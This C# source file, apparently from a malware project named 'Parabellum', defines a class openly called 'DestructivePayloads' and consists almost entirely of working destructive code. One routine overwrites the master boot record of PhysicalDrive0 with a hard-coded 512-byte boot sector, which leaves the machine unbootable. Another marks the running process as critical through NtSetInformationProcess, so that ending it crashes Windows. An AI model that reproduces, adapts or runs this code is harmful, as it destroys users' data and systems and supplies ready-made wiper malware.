using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using Vanara.PInvoke;
using static Vanara.PInvoke.Kernel32;

namespace Parabellum
{
    public class DestructivePayloads
    {
        public class MBR
        {
            public static void Mbr()
            {
                var mbrData = new byte[]
                {
                    0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xE8, 0x05, 0x00, 0xE8, 0x4A, 0x00,
0xEB, 0xF8, 0x31, 0xFF, 0xB9, 0x40, 0x01, 0xBA, 0xC8, 0x00, 0x8B, 0x1E, 0x6A, 0x7C, 0x89, 0xF8,
0x01, 0xD8, 0x25, 0xFF, 0x00, 0x00, 0xD0, 0xC0, 0xE8, 0x03, 0x88, 0xDC, 0x80, 0xE4, 0x90, 0x80,
0xFC, 0x00, 0x74, 0x11, 0x80, 0xFC, 0x14, 0x74, 0x00, 0x24, 0x8F, 0x04, 0xFC, 0xEB, 0x0A, 0x24,
0x2F, 0x04, 0x16, 0xEB, 0x04, 0x24, 0x2F, 0x04, 0x0D, 0x26, 0x88, 0x05, 0x47, 0xE2, 0xCF, 0xB9,
0x40, 0x01, 0x4A, 0x75, 0xC9, 0xFF, 0x06, 0x6A, 0x7C, 0xC3, 0xB9, 0xFF, 0xFF, 0xBA, 0x15, 0x01,
0xB9, 0xFF, 0xFF, 0x90, 0xE2, 0xFD, 0x4A, 0x75, 0xF7, 0xC3, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
                };

                var mbr = CreateFile("\\\\.\\PhysicalDrive0",
                                     Kernel32.FileAccess.GENERIC_ALL,
                                     FileShare.Read | FileShare.Write,
                                     null,
                                     FileMode.Open,
                                     0,
                                     null);

                WriteFile(mbr, mbrData, 512u, out uint lpNumberOfBytesWritten, IntPtr.Zero);
            }
        }

        public class BSOD
        {
            [DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", SetLastError = true)]
            private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
            public static void SetCritical()
            {
                int isCritical = 1;  // true
                var handle = Process.GetCurrentProcess().Handle;
                Process.EnterDebugMode();
                NtSetInformationProcess(handle, 0x1D, ref isCritical, sizeof(int));
            }
        }
    }
}
